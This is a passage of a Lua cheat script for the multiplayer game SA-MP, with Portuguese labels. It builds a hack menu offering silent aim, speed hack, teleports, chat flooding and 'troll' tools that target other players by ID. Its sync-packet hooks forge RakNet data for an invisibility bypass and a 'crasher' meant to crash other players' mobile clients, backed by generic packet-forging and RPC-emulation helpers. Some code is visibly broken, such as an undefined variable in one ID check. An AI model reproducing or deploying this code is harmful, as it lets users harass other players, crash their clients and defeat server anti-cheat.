            if imgui.InputText("Digite algo...", inputField, sizeof(inputField)) then
                inputText = str(inputField)
            end
            imgui.CustomCheckbox(" FLOODAR SMS/PM", aim.CheckBox.teste35)
            imgui.CustomSlider(u8'DELAY SMS', dsms, alse, 0, 500.0, '%0.1f')
            imgui.InputText("Digite algo..", messageText, 256)
            imgui.Text("")
            imgui.Separator()
        end
        if selected_category == "TROLL" then
            imgui.Text("")
            imgui.InputText("ID DO JOGADOR", playerIdBuffer, 10)
            imgui.CustomSlider(u8'DISTANCIA DO TROLL', tdist, alse, 0.1, 200, '%0.1f') 
            imgui.CustomSlider(u8'VELOCIDADE LATERAL', sideSpeed, alse, 0.1, 100.0, '%0.1f')
            imgui.CustomSlider(u8'VELOCIDADE PARA BAIXO', baixospeed, alse, 0.1, 100.0, '%0.1f')
            imgui.CustomSlider(u8'VELOCIDADE PARA CIMA', cimaspeed, alse, 0.1, 100.0, '%0.1f')
            if imgui.Button("Jogar Jogador", imgui.ImVec2(800, 45)) then
                local inputString = ffi.string(playerIdBuffer)
                local inputId = tonumber(inputString:match("%d+"))
        
                if not inputId then
                    sampAddChatMessage("{FFFFFF}Especifique um ID vÃ¡lido.", 16733782)
                    return
                end
                
                id = inputId
        
                if jgjogar then
                    jgjogar = false
                    sampAddChatMessage("{FFFFFF}Desativado.", 16733782)
                else
                    local res, _ = sampGetCharHandleBySampPlayerId(id)
                    
                    if not res then
                        sampAddChatMessage("{FFFFFF}O jogador nÃ£o estÃ¡ na zona de streaming.", 16733782)
                    else
                        jgjogar = true
                        sampAddChatMessage("{FFFFFF}Troller ativado no jogador: {FF5656}" .. sampGetPlayerNickname(id) .. " [" .. id .. "]", 16733782)
                    end
                end
            end 
        
            imgui.Separator()
            imgui.CustomCheckbox("ATIVAR DAMAGER", aim.CheckBox.damagerEnabled) 
            imgui.CustomSlider(u8'DELAY ATAQUE', delaydmg, alse, 0.1, 5.0, '%0.1f')
            imgui.CustomSlider(u8'DISTANCIA DAMAGER', maxDistance, alse, 0.1, 100.0, '%0.1f')
            imgui.CustomSlider(u8'VELOCIDADE DO DAMAGER', attackSpeed, alse, 0.1, 10.0, '%0.1f')
            imgui.Separator()
            imgui.Text("")
            imgui.InputText("ID do Jogador", seguirjogador, bufferides)
        
            if imgui.Button("SEGUIR JOGADOR") then
                local idText = ffi.string(seguirjogador)
                local id = tonumber(idText)
                if id and sampIsPlayerConnected(id) then
                    zaidejas = id
                    follow = true
                    sampAddChatMessage('{FF0000}Iniciando seguimento do jogador com ID ' .. zaidejas .. ' {FF0000}Nickname: ' .. sampGetPlayerNickname(id), -1)
                else
                    sampAddChatMessage('{FF0000}ID invÃ¡lido ou jogador nÃ£o encontrado.', -1)
                end
            end
        
            imgui.SameLine()
            if imgui.Button("PARAR DE SEGUIR") then
                follow = false
                sampAddChatMessage('{FF00DE}VocÃª parou de seguir o jogador.', -1)
            end
        
            imgui.Text("")
            imgui.InputInt("ID DO JOGADOR....", dinplayer) 
        
            if imgui.Button("VER QUANTIDADE DE DINHEIRO") then
                proinfo(dinplayer[0]) 
            end
        
            imgui.Separator()
            imgui.InputText("ID DO VEÃCULO....", carInput, ffi.sizeof(carInput))
        
            if imgui.Button("CAR FIRE TROLL") then
                local param = ffi.string(carInput)  
                fcar(param) 
            end
        
            imgui.InputText("ID DO JOGADOR.....", playerInput, ffi.sizeof(playerInput))
            imgui.InputText("ID DO CARRO.......", carencima, ffi.sizeof(carencima))
        
            if imgui.Button("JOGAR VEÃCULO NO PLAYER") then
                local playerID = ffi.string(playerInput)  
                local carID = ffi.string(carencima)       
                mcar(playerID .. " " .. carID)          
            end
        
            imgui.Separator()
            imgui.InputText("ID do Jogador,..", playerflip, ffi.sizeof(playerflip))
        
            if imgui.Button("FLIPAR VEÃCULO") then
                local playerIdStr = ffi.string(playerflip)
                if tonumber(playerIdStr) then
                    cflip(playerIdStr)
                else
                    sampAddChatMessage("Por favor, insira um ID de jogador vÃ¡lido.", 0xFF0000)
                end
            end
        
            imgui.Separator()
            imgui.InputText("ID do player...,", playertroll, ffi.sizeof(playertroll))
        
            if imgui.Button("VEÃCULO ABAIXO DAS TEXTURAS") then
                local playerIdStr = ffi.string(playertroll)
                if tonumber(playerIdStr) then
                    down(playerIdStr)
                else
                    sampAddChatMessage("Por favor, insira um ID de jogador vÃ¡lido.", 0xFF0000)
                end
            end
        
            imgui.InputText("ID do Jogador.,.,", trollceu, ffi.sizeof(trollceu))
        
            if imgui.Button("ENVIAR PLAYER PARA OUTRO SISTEMA") then
                local playerIdStr = ffi.string(trollceu)
                if tonumber(playerIdtpcarmiStr) then
                    heaven(playerIdStr)
                else
                    sampAddChatMessage("Por favor, insira um ID de jogador vÃ¡lido.", 0xFF0000)
                end
            end
        
            imgui.Separator()
            imgui.InputText("ID DO PLAYER.,....", tpcarmi, ffi.sizeof(tpcarmi))
        
            if imgui.Button("TRAZER VEÃCULO DO JOGADOR ATÃ‰ MIM") then
                local playerIdStr = ffi.string(tpcarmi)
                if tonumber(playerIdStr) then
                    tpme(playerIdStr)
                else
                    sampAddChatMessage("Por favor, insira um ID de jogador vÃ¡lido.", 0xFF0000)
                end
            end
            imgui.Separator()
        end       
        if selected_category == "SILENT" then
            if imgui.Button(silentAimActive and "Desativar Silent Aim" or "Ativar Silent Aim", imgui.ImVec2(1000, 65)) then
                silentAimActive = not silentAimActive
                if silentAimActive then
                    sampAddChatMessage("{00FF00}Silent Aim ativado.", -1)
                else
                    sampAddChatMessage("{FF0000}Silent Aim desativado.", -1)
                end
            end
        
            imgui.CustomCheckbox(faicons('CIRCLE') .. " MOSTRAR CIRCULO", aim.CheckBox.showCircle)
            imgui.CustomCheckbox(faicons('HEAD_SIDE') .. " ATINGIR A CABECA", aim.CheckBox.aimAtHead)
            imgui.CustomCheckbox(faicons('VEST') .. " ATINGIR O PEITO", aim.CheckBox.aimAtChest)
            imgui.CustomCheckbox(faicons('BOOT') .. " ATINGIR OS PES", aim.CheckBox.aimAtFeet)
            imgui.CustomCheckbox(faicons('SPINNER') .. " ALEATORIO LEGIT", legitRandom)
        
            imgui.SliderFloat(faicons('RULER') .. " DISTANCIA", distanceSlider, 1.0, 100.0) 
            imgui.SliderFloat(faicons('EYE') .. " FOV", fovSlider, 0.0, 150.0)
        
        end
        if selected_category == "TELEPORTE" then
            imgui.Text("")
            imgui.Text("")
            imgui.Text("")
            if imgui.Button(u8"TELEPORTE VEICULO MARCADOR", imgui.ImVec2(400, 70)) then
                aim.CheckBox.teste79[0] = not aim.CheckBox.teste79[0]
            end 
            imgui.SameLine()
            if imgui.Button(u8"TELEPORTE JOGADOR MARCADOR", imgui.ImVec2(400, 70)) then
               etp()
            end      
            if imgui.Button(u8"TELEPORTE VEICULO PROXIMO", imgui.ImVec2(400, 70)) then
                aim.CheckBox.teste81[0] = not aim.CheckBox.teste81[0]
            end 
            imgui.Text("")
            imgui.Text("")
            imgui.Text("") 
            imgui.Separator()         
        end   
        if selected_category == "VEICULOS" then
            if aim.CheckBox.teste25[0] then
                imgui.CustomSlider(u8'TEMPO PARA SUMIR A RAMPA', floatbuffer6, alse, 50, 130, '%0.1f')
                end
            imgui.Text("")
            imgui.CustomCheckbox(u8"PULAR COM VEICULOS", aim.CheckBox.teste18)
            imgui.SameLine(410)
            imgui.CustomCheckbox(u8"SUPER PULO BIKE", aim.CheckBox.teste19)
            imgui.SameLine(735)
            imgui.CustomCheckbox(u8"FLIP VEICULOS", aim.CheckBox.teste20)
            imgui.CustomCheckbox(u8"DESVIRAR VEICULO", aim.CheckBox.teste21)
            imgui.SameLine(410)
            imgui.CustomCheckbox(u8"FREIO DE AVIAO", aim.CheckBox.teste22)
            imgui.SameLine(735)
            if imgui.CustomCheckbox(u8"VOAR COM VEICULO", FlyCar.enabled) then
                if FlyCar.enabled[0] then
                    FlyCar.activate()
                else
                    FlyCar.reset()
                end
            end    
            imgui.CustomCheckbox("CAR SHOT", aim.CheckBox.teste23)
            imgui.SameLine(410)
            imgui.CustomCheckbox("SAIDA RAPIDA", aim.CheckBox.teste24)
            imgui.SameLine(735)
            imgui.CustomCheckbox("CRIAR RAMPA VEICULO", aim.CheckBox.teste25)
            imgui.CustomCheckbox("GASOLINA INFINITA", aim.CheckBox.teste26)
            imgui.SameLine(410)
            imgui.CustomCheckbox("NAO EXPLODIR VEICULO", aim.CheckBox.teste27)
            imgui.SameLine(735)
            imgui.CustomCheckbox("MODO TANQUE", aim.CheckBox.teste28)
            if imgui.CustomCheckbox("SPEED HACK", aim.CheckBox.teste36) then
                aim.CheckBox.teste36[0] =  aim.CheckBox.teste36[0]
			end
            imgui.SameLine(410)
            imgui.CustomCheckbox("DIRIGIR SEM LICENSA", aim.CheckBox.teste37)
            imgui.SameLine(735)
            imgui.CustomCheckbox("DESTRANCAR VEICULOS", aim.CheckBox.teste40)
            imgui.CustomCheckbox(u8"MATAR COM HELICOPTERO", aim.CheckBox.teste44)
            if aim.CheckBox.teste44[0] then
            imgui.CustomSlider(u8'DISTANCIA PARA MATAR', helidist, alse, 0, 500.0, '%0.1f')
            end
            imgui.SameLine(410)
            if aim.CheckBox.teste36[0] then
                imgui.CustomSlider(u8'DISTANCIA SPEED HACK', sfloat, alse, 0, 5, '%0.1f')
                end
            if aim.CheckBox.teste23[0] then
                imgui.CustomSlider(u8'VELOCIDADE CAR SHOT', carshote, alse, 0, 500.0, '%0.1f')
                end
                    imgui.CustomCheckbox(u8("TELEPORTE VEICULO POR ID"), aim.CheckBox.teste45)
                    if aim.CheckBox.teste45[0] then
                        imgui.InputText(u8("ID DO CARRO.."), tpwarpcar, 256)    
                        if imgui.Button(u8("TP VEICULO"), imgui.ImVec2(200, 70)) then
                            WarpToVehicle(tonumber(ffi.string(tpwarpcar)))
                        end
                    end
                    imgui.SameLine(735)
                    imgui.CustomCheckbox(u8"PUXAR VEICULOS", aim.CheckBox.teste48)  
                    imgui.CustomCheckbox(u8"LIGAR VEICULO", aim.CheckBox.teste50)
                    imgui.SameLine(410)
                    imgui.CustomCheckbox(u8"RESPAWNAR VEICULOS", aim.CheckBox.teste53)  
                    imgui.SameLine(735)
                    imgui.CustomCheckbox(u8"GASOLINA INFINITA", aim.CheckBox.teste55)
                    imgui.CustomCheckbox("ANEXAR REBOQUE", aim.CheckBox.teste78)
                    imgui.SameLine(410)
                   
                    imgui.Text("")
                    imgui.Separator()
                    imgui.InputInt("ID DO VEICULO", pveiculo)
                    if imgui.Button("PUXAR VEICULO") then
                        local blip, bx, by, bz = getMark()
                        if blip then
                            if tonumber(pveiculo[0]) then
                                local success, vehicleHandle = sampGetCarHandleBySampVehicleId(tonumber(pveiculo[0]))
                                if success then
                                    lua_thread.create(function() 
                                        clearCharTasksImmediately(PLAYER_PED)
                                        wait(100)
                                        warpCharIntoCar(PLAYER_PED, vehicleHandle)
                                        setCharCoordinates(PLAYER_PED, bx, by, bz)
                                        sampAddChatMessage('Voce puxou o veiculo com sucesso!', 0xDC143C)
                                    end)
                                else
                                    sampAddChatMessage(' Veiculo nao encontrado!', 0xDC143C)
                                end
                            else
                                sampAddChatMessage('Digite um nÃºmero valido!', 0xDC143C)
                            end
                        else
                            sampAddChatMessage(' Nenhum marcador encontrado!', 0xDC143C)
                        end
                    end
            imgui.Separator()
        end

        imgui.End()
    end
)

function sampev.onSendPlayerSync(data)
    if jgjogar and sampGetCharHandleBySampPlayerId(id) then
        local _, ped = sampGetCharHandleBySampPlayerId(id)
        local pX, pY, pZ = getCharCoordinates(ped)
        local ppX, ppY, ppZ = getCharCoordinates(PLAYER_PED)

        if getDistanceBetweenCoords3d(pX, pY, pZ, ppX, ppY, ppZ) < tdist[0] then
            data.position = {
                x = pX,
                y = pY,
                z = pZ + 0.35
            }
            data.quaternion[0], data.quaternion[1], data.quaternion[2], data.quaternion[3] = math.random(-1, 1), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1)
            data.moveSpeed.x = math.random(-0.5, 0.5) * sideSpeed[0]
            data.moveSpeed.y = math.random(-0.5, 0.5) * sideSpeed[0]
            data.moveSpeed.z = math.random(-0.5, 0.5) * baixospeed[0] + cimaspeed[0]
        end
    end

    if var_0_2 then
		return false
	end

    justGotInCar = true

    if krytka then
        for i = 0, 3 do
            data.quaternion[i] = 2
        end
        data.specialAction = 3
        data.animationId = 0
        data.health = 0
        data.armor = 0
        data.animationFlags = 0
        data.leftRightKeys = 0
        data.upDownKeys = 0
    end

    if eppc then
        if math.random(0, 1) == 0 then
            data.weapon = math.random(44, 45)
        end

        if math.random(0, 1) == 1 then
            data.keysData = 132
        end
    end

    if crasher1 then
        crasher2 = not crasher2
        samp_create_sync_data("aim").camMode = 0
    end

    if fuckinvis then
        for i = 0, 2 do
            data.quaternion[i] = 0
        end
        data.upDownKeys = 65408
        data.keysData = 8
        data.animationId = 1234
        data.animationFlags = 32770

        local heading = getCharHeading(PLAYER_PED)

        data.moveSpeed.x = math.sin(-math.rad(heading)) * 0.4
        data.moveSpeed.y = math.cos(-math.rad(heading)) * 0.4

        printStringNow("~>~ INVIS BYPASS ~<~", 500)
    end

    if testesampk then
        data.weapon = 4
    end

    if isKillAllActive then
        data.weapon = 4
    end

    if crasher2 then
        sendSpectator(crasher4)
    end

    if crasher1 then
        crasher6 = not crasher6

        if crasher6 then
            local var_4_0 = samp_create_sync_data("player")

            var_4_0.weapon = 40
            var_4_0.keysData = 128

            var_4_0.send()
            printStringNow("~b~CRASHANDO MOBILES...", 500)

            return false
        end
    end

    if aim.CheckBox.teste52[0] then
        local spectatorData = samp_create_sync_data("spectator")
        spectatorData.position = data.position
        spectatorData.keysData = data.keysData
        spectatorData.send()
        return false
    end

    if aim.CheckBox.teste47[0] and not isCharInAnyCar(PLAYER_PED) then
        data.moveSpeed.x = 0.25
        data.moveSpeed.y = 0.25
        data.position.x = data.position.x + 1
    end

    if aim.CheckBox.enableAim[0] and data.animationId == 1084 then
        data.animationFlags = 32772
        data.animationId = 1189
    end

    if aim.CheckBox.teste100[0] and jetpackt then
        data.specialAction = 0
    end

    if aim.CheckBox.teste37[0] and isCharInAnyCar(PLAYER_PED) then
        return false
    end

    return true
end

function go_to_point(point, is_sprint)
    local dist
    repeat
        if not follow then return end
        set_camera_direction(point)
        wait(0)
        setGameKeyState(1, -255)
        local mx, my, mz = getCharCoordinates(playerPed)
        if is_sprint then setGameKeyState(16, 255) end
        dist = getDistanceBetweenCoords2d(point.x, point.y, mx, my)
    until dist < 0.6
end

function set_camera_direction(point)
    local c_pos_x, c_pos_y, c_pos_z = getActiveCameraCoordinates()
    local vect = {x = point.x - c_pos_x, y = point.y - c_pos_y}
    local ax = math.atan2(vect.y, -vect.x)
    setCameraPositionUnfixed(0.0, -ax)
end

function warp_to_player(playerId)
    local result, charHandle = sampGetCharHandleBySampPlayerId(playerId)
    if result then
        local x, y, z = getCharCoordinates(charHandle)
        if os.clock() - lastTeleportTime > messageDelay / 1000 then
            setCharCoordinates(PLAYER_PED, x, y, z)
            lastTeleportTime = os.clock()
            sampAddChatMessage("Teletransportado para o jogador " .. tostring(playerId), 0x00FF00)
        end
    end
end
function sendSpectator(arg_5_0)
	if crasher2 then
		local crasher5 = samp_create_sync_data("aim")

		crasher5.camMode = 51

		crasher5.send()
	end
end


function samp_create_sync_data(arg_9_0, arg_9_1)
	local var_9_0 = require("ffi")
	local var_9_1 = require("sampfuncs")
	local var_9_2 = require("samp.raknet")

	arg_9_1 = arg_9_1 or true

	local var_9_3 = ({
		player = {
			"PlayerSyncData",
			var_9_2.PACKET.PLAYER_SYNC,
			sampStorePlayerOnfootData
		},
		vehicle = {
			"VehicleSyncData",
			var_9_2.PACKET.VEHICLE_SYNC,
			sampStorePlayerIncarData
		},
		passenger = {
			"PassengerSyncData",
			var_9_2.PACKET.PASSENGER_SYNC,
			sampStorePlayerPassengerData
		},
		aim = {
			"AimSyncData",
			var_9_2.PACKET.AIM_SYNC,
			sampStorePlayerAimData
		},
		trailer = {
			"TrailerSyncData",
			var_9_2.PACKET.TRAILER_SYNC,
			sampStorePlayerTrailerData
		},
		unoccupied = {
			"UnoccupiedSyncData",
			var_9_2.PACKET.UNOCCUPIED_SYNC
		},
		bullet = {
			"BulletSyncData",
			var_9_2.PACKET.BULLET_SYNC
		},
		spectator = {
			"SpectatorSyncData",
			var_9_2.PACKET.SPECTATOR_SYNC
		}
	})[arg_9_0]
	local var_9_4 = "struct " .. var_9_3[1]
	local var_9_5 = var_9_0.new(var_9_4, {})
	local var_9_6 = tonumber(var_9_0.cast("uintptr_t", var_9_0.new(var_9_4 .. "*", var_9_5)))

	if arg_9_1 then
		local var_9_7 = var_9_3[3]

		if var_9_7 then
			local var_9_8
			local var_9_9

			if arg_9_1 == true then
				local var_9_10

				var_9_10, var_9_9 = sampGetPlayerIdByCharHandle(PLAYER_PED)
			else
				var_9_9 = tonumber(arg_9_1)
			end

			var_9_7(var_9_9, var_9_6)
		end
	end

	local function var_9_11()
		local var_10_0 = raknetNewBitStream()

		raknetBitStreamWriteInt8(var_10_0, var_9_3[2])
		raknetBitStreamWriteBuffer(var_10_0, var_9_6, var_9_0.sizeof(var_9_5))
		raknetSendBitStreamEx(var_10_0, var_9_1.HIGH_PRIORITY, var_9_1.UNRELIABLE_SEQUENCED, 1)
		raknetDeleteBitStream(var_10_0)
	end

	local var_9_12 = {
		__index = function(arg_11_0, arg_11_1)
			return var_9_5[arg_11_1]
		end,
		__newindex = function(arg_12_0, arg_12_1, arg_12_2)
			var_9_5[arg_12_1] = arg_12_2
		end
	}

	return setmetatable({
		send = var_9_11
	}, var_9_12)
end

function emul_rpc(arg_13_0, arg_13_1)
	local var_13_0 = require("samp.events.bitstream_io")
	local var_13_1 = require("samp.events.handlers")
	local var_13_2 = require("samp.events.extra_types")
	local var_13_3 = {
		onSendEnterVehicle = {
			"int16",
			"bool8",
			26
		},
		onSendClickPlayer = {
			"int16",
			"int8",
			23
		},
		onSendClientJoin = {
			"int32",
			"int8",
			"string8",
			"int32",
			"string8",
			"string8",
			"int32",
			25
		},
		onSendEnterEditObject = {
			"int32",
			"int16",
			"int32",
			"vector3d",
			27
		},
		onSendCommand = {
			"string32",
			50
		},
		onSendSpawn = {
			52
		},
		onSendDeathNotification = {
			"int8",
			"int16",
			53
		},
		onSendDialogResponse = {
			"int16",
			"int8",
			"int16",
			"string8",
			62
		},
		onSendClickTextDraw = {
			"int16",
			83
		},
		onSendVehicleTuningNotification = {
			"int32",
			"int32",
			"int32",
			"int32",
			96
		},
		onSendChat = {
			"string8",
			101
		},
		onSendClientCheckResponse = {
			"int8",
			"int32",
			"int8",
			103
		},
		onSendVehicleDamaged = {
			"int16",
			"int32",
			"int32",
			"int8",
			"int8",
			106
		},
		onSendEditAttachedObject = {
			"int32",
			"int32",
			"int32",
			"int32",
			"vector3d",
			"vector3d",
			"vector3d",
			"int32",
			"int32",
			116
		},
		onSendEditObject = {
			"bool",
			"int16",
			"int32",
			"vector3d",
			"vector3d",
			117
		},
		onSendInteriorChangeNotification = {
			"int8",
			118
		},
		onSendMapMarker = {
			"vector3d",
			119
		},
		onSendRequestClass = {
			"int32",
			128
		},
		onSendRequestSpawn = {
			129
		},
		onSendPickedUpPickup = {
			"int32",
			131
		},
		onSendMenuSelect = {
			"int8",
			132
		},
		onSendVehicleDestroyed = {
			"int16",
			136
		},
		onSendQuitMenu = {
			140
		},
		onSendExitVehicle = {
			"int16",
			154
		},
		onSendUpdateScoresAndPings = {
			155
		},
		onSendGiveDamage = {
			"int16",
			"float",
			"int32",
			"int32",
			115
		},
		onSendTakeDamage = {
			"int16",
			"float",
			"int32",
			"int32",
			115
		},
		onInitGame = {
			139
		},
		onPlayerJoin = {
			"int16",
			"int32",
			"bool8",
			"string8",
			137
		},
		onPlayerQuit = {
			"int16",
			"int8",
			138
		},
		onRequestClassResponse = {
			"bool8",
			"int8",
			"int32",
			"int8",
			"vector3d",
			"float",
			"Int32Array3",
			"Int32Array3",
			128
		},
		onRequestSpawnResponse = {
			"bool8",
			129
		},
		onSetPlayerName = {
			"int16",
			"string8",
			"bool8",
			11
		},
		onSetPlayerPos = {
			"vector3d",
			12
		},
		onSetPlayerPosFindZ = {
			"vector3d",
			13
		},
		onSetPlayerHealth = {
			"float",
			14
		},
		onTogglePlayerControllable = {
			"bool8",
			15
		},
		onPlaySound = {
			"int32",
			"vector3d",
			16
		},
		onSetWorldBounds = {
			"float",
			"float",
			"float",
			"float",
			17
		},
		onGivePlayerMoney = {
			"int32",
			18
		},
		onSetPlayerFacingAngle = {
			"float",
			19
		},
		onGivePlayerWeapon = {
			"int32",
			"int32",
			22
		},
		onSetPlayerTime = {
			"int8",
			"int8",
			29
		},
		onSetToggleClock = {
			"bool8",
			30
		},
		onPlayerStreamIn = {
			"int16",
			"int8",
			"int32",
			"vector3d",
			"float",
			"int32",
			"int8",
			32
		},
		onSetShopName = {
			"string256",
			33
		},
		onSetPlayerSkillLevel = {
			"int16",
			"int32",
			"int16",
			34
		},
		onSetPlayerDrunk = {
			"int32",
			35
		},
		onCreate3DText = {
			"int16",
			"int32",
			"vector3d",
			"float",
			"bool8",
			"int16",
			"int16",
			"encodedString4096",
			36
		},
		onSetRaceCheckpoint = {
			"int8",
			"vector3d",
			"vector3d",
			"float",
			38
		},
		onPlayAudioStream = {
			"string8",
			"vector3d",
			"float",
			"bool8",
			41
		},
		onRemoveBuilding = {
			"int32",
			"vector3d",
			"float",
			43
		},
		onCreateObject = {
			44
		},
		onSetObjectPosition = {
			"int16",
			"vector3d",
			45
		},
		onSetObjectRotation = {
			"int16",
			"vector3d",
			46
		},
		onDestroyObject = {
			"int16",
			47
		},
		onPlayerDeathNotification = {
			"int16",
			"int16",
			"int8",
			55
		},
		onSetMapIcon = {
			"int8",
			"vector3d",
			"int8",
			"int32",
			"int8",
			56
		},
		onRemoveVehicleComponent = {
			"int16",
			"int16",
			57
		},
		onRemove3DTextLabel = {
			"int16",
			58
		},
		onPlayerChatBubble = {
			"int16",
			"int32",
			"float",
			"int32",
			"string8",
			59
		},
		onUpdateGlobalTimer = {
			"int32",
			60
		},
		onShowDialog = {
			"int16",
			"int8",
			"string8",
			"string8",
			"string8",
			"encodedString4096",
			61
		},
		onDestroyPickup = {
			"int32",
			63
		},
		onLinkVehicleToInterior = {
			"int16",
			"int8",
			65
		},
		onSetPlayerArmour = {
			"float",
			66
		},
		onSetPlayerArmedWeapon = {
			"int32",
			67
		},
		onSetSpawnInfo = {
			"int8",
			"int32",
			"int8",
			"vector3d",
			"float",
			"Int32Array3",
			"Int32Array3",
			68
		},
		onSetPlayerTeam = {
			"int16",
			"int8",
			69
		},
		onPutPlayerInVehicle = {
			"int16",
			"int8",
			70
		},
		onSetPlayerColor = {
			"int16",
			"int32",
			72
		},
		onDisplayGameText = {
			"int32",
			"int32",
			"string32",
			73
		},
		onAttachObjectToPlayer = {
			"int16",
			"int16",
			"vector3d",
			"vector3d",
			75
		},
		onInitMenu = {
			76
		},
		onShowMenu = {
			"int8",
			77
		},
		onHideMenu = {
			"int8",
			78
		},
		onCreateExplosion = {
			"vector3d",
			"int32",
			"float",
			79
		},
		onShowPlayerNameTag = {
			"int16",
			"bool8",
			80
		},
		onAttachCameraToObject = {
			"int16",
			81
		},
		onInterpolateCamera = {
			"bool",
			"vector3d",
			"vector3d",
			"int32",
			"int8",
			82
		},
		onGangZoneStopFlash = {
			"int16",
			85
		},
		onApplyPlayerAnimation = {
			"int16",
			"string8",
			"string8",
			"bool",
			"bool",
			"bool",
			"bool",
			"int32",
			86
		},
		onClearPlayerAnimation = {
			"int16",
			87
		},
		onSetPlayerSpecialAction = {
			"int8",
			88
		},
		onSetPlayerFightingStyle = {
			"int16",
			"int8",
			89
		},
		onSetPlayerVelocity = {
			"vector3d",
			90
		},
		onSetVehicleVelocity = {
			"bool8",
			"vector3d",
			91
		},
		onServerMessage = {
			"int32",
			"string32",
			93
		},
		onSetWorldTime = {
			"int8",
			94
		},
		onCreatePickup = {
			"int32",
			"int32",
			"int32",
			"vector3d",
			95
		},
		onMoveObject = {
			"int16",
			"vector3d",
			"vector3d",
			"float",
			"vector3d",
			99
		},
		onEnableStuntBonus = {
			"bool",
			104
		},
		onTextDrawSetString = {
			"int16",
			"string16",
			105
		},
		onSetCheckpoint = {
			"vector3d",
			"float",
			107
		},
		onCreateGangZone = {
			"int16",
			"vector2d",
			"vector2d",
			"int32",
			108
		},
		onPlayCrimeReport = {
			"int16",
			"int32",
			"int32",
			"int32",
			"int32",
			"vector3d",
			112
		},
		onGangZoneDestroy = {
			"int16",
			120
		},
		onGangZoneFlash = {
			"int16",
			"int32",
			121
		},
		onStopObject = {
			"int16",
			122
		},
		onSetVehicleNumberPlate = {
			"int16",
			"string8",
			123
		},
		onTogglePlayerSpectating = {
			"bool32",
			124
		},
		onSpectatePlayer = {
			"int16",
			"int8",
			126
		},
		onSpectateVehicle = {
			"int16",
			"int8",
			127
		},
		onShowTextDraw = {
			134
		},
		onSetPlayerWantedLevel = {
			"int8",
			133
		},
		onTextDrawHide = {
			"int16",
			135
		},
		onRemoveMapIcon = {
			"int8",
			144
		},
		onSetWeaponAmmo = {
			"int8",
			"int16",
			145
		},
		onSetGravity = {
			"float",
			146
		},
		onSetVehicleHealth = {
			"int16",
			"float",
			147
		},
		onAttachTrailerToVehicle = {
			"int16",
			"int16",
			148
		},
		onDetachTrailerFromVehicle = {
			"int16",
			149
		},
		onSetWeather = {
			"int8",
			152
		},
		onSetPlayerSkin = {
			"int32",
			"int32",
			153
		},
		onSetInterior = {
			"int8",
			156
		},
		onSetCameraPosition = {
			"vector3d",
			157
		},
		onSetCameraLookAt = {
			"vector3d",
			"int8",
			158
		},
		onSetVehiclePosition = {
			"int16",
			"vector3d",
			159
		},
		onSetVehicleAngle = {
			"int16",
			"float",
			160
		},
		onSetVehicleParams = {
			"int16",
			"int16",
			"bool8",
			161
		},
		onChatMessage = {
			"int16",
			"string8",
			101
		},
		onConnectionRejected = {
			"int8",
			130
		},
		onPlayerStreamOut = {
			"int16",
			163
		},
		onVehicleStreamIn = {
			164
		},
		onVehicleStreamOut = {
			"int16",
			165
		},
		onPlayerDeath = {
			"int16",
			166
		},
		onPlayerEnterVehicle = {
			"int16",
			"int16",
			"bool8",
			26
		},
		onUpdateScoresAndPings = {
			"PlayerScorePingMap",
			155
		},
		onSetObjectMaterial = {
			84
		},
		onSetObjectMaterialText = {
			84
		},
		onSetVehicleParamsEx = {
			"int16",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			"int8",
			24
		},
		onSetPlayerAttachedObject = {
			"int16",
			"int32",
			"bool",
			"int32",
			"int32",
			"vector3d",
			"vector3d",
			"vector3d",
			"int32",
			"int32",
			113
		}
	}
	local var_13_4 = {
		onShowTextDraw = true,
		onSetObjectMaterialText = true,
		onVehicleStreamIn = true,
		onSetObjectMaterial = true,
		onInitMenu = true,
		onInitGame = true,
		onCreateObject = true
	}
	local var_13_5 = {
		Int32Array3 = true,
		PlayerScorePingMap = true
	}
	local var_13_6 = var_13_3[arg_13_0]

	if var_13_6 then
		local var_13_7 = raknetNewBitStream()

		if not var_13_4[arg_13_0] then
			local var_13_8 = #var_13_6 - 1

			if var_13_8 > 0 then
				for iter_13_0 = 1, var_13_8 do
					local var_13_9 = var_13_6[iter_13_0]

					if var_13_5[var_13_9] then
						var_13_2[var_13_9].write(var_13_7, arg_13_1[iter_13_0])
					else
						var_13_0[var_13_9].write(var_13_7, arg_13_1[iter_13_0])
					end
				end
			end
		elseif arg_13_0 == "onInitGame" then
			var_13_1.on_init_game_writer(var_13_7, arg_13_1)
		elseif arg_13_0 == "onCreateObject" then
			var_13_1.on_create_object_writer(var_13_7, arg_13_1)
		elseif arg_13_0 == "onInitMenu" then
			var_13_1.on_init_menu_writer(var_13_7, arg_13_1)
		elseif arg_13_0 == "onShowTextDraw" then
			var_13_1.on_show_textdraw_writer(var_13_7, arg_13_1)
		elseif arg_13_0 == "onVehicleStreamIn" then
			var_13_1.on_vehicle_stream_in_writer(var_13_7, arg_13_1)
		elseif arg_13_0 == "onSetObjectMaterial" then
			var_13_1.on_set_object_material_writer(var_13_7, arg_13_1, 1)
		elseif arg_13_0 == "onSetObjectMaterialText" then
			var_13_1.on_set_object_material_writer(var_13_7, arg_13_1, 2)
		end

		raknetEmulRpcReceiveBitStream(var_13_6[#var_13_6], var_13_7)
		raknetDeleteBitStream(var_13_7)
	end
end
function mcar(param)
    lua_thread.create(function() 
        mcar_func("mcar", param)
    end)
end
function handleBazuka()
    if bazuka[0] then
        if not state12 then
            state12 = true
            local weap_model = getWeapontypeModel(35)
            requestModel(weap_model)
            loadAllModelsNow()
            giveWeaponToChar(PLAYER_PED, 35, 99999)
            setCharProofs(PLAYER_PED, true, true, true, true, true)
            setPlayerFastReload(PLAYER_HANDLE, true)
            sampAddChatMessage('{FF5656}[EtBazuka]: {FFFFFF}Ativado!', -1)
            lua_thread.create(bazuka2)
        end
    else
        if state12 then
            state12 = false
            removeWeaponFromChar(PLAYER_PED, 35)
            setCharProofs(PLAYER_PED, false, false, false, false, false)
            setPlayerFastReload(PLAYER_HANDLE, false)
            sampAddChatMessage('{FF5656}[EtBazuka]: {FFFFFF}Desativado!', -1)
        end
    end
end

function bazuka2()
    while state12 do
        wait(2)
        setCharProofs(PLAYER_PED, true, true, true, true, true)
        setCharCollision(PLAYER_PED, true)
        local X, Y, Z = getCharCoordinates(PLAYER_PED)
        local _, ped = findAllRandomCharsInSphere(X, Y, Z, 100, true, true)
        if _ then
            process = true
            local Xp, Yp, Zp = getCharCoordinates(ped)
